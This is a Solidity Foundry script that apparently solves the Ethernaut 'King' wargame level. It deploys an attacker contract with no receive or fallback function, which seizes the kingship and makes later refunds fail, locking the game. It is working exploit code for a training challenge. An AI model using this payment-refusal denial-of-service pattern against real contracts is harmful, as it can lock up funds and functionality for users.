// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Level9.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{

    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value:_kingInstance.prize()}("");//calling the receiver function in King contract
    }
    //since there is no fallback or receive function in this contract ,we can successfully denied the money
}

contract Level9Sol is Script{

    King public kingInstance = King(payable(0xb6Db4938daB72C9e2DF8a19eE5846D2692872441));

    function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    
    console.log("first King is :",kingInstance._king());
    console.log("first prize is:",kingInstance.prize());
  
    new Attack{value:kingInstance.prize()}(kingInstance);

    console.log("second King is :",kingInstance._king());
    console.log("second prize is:",kingInstance.prize());


    vm.stopBroadcast();

    }

}
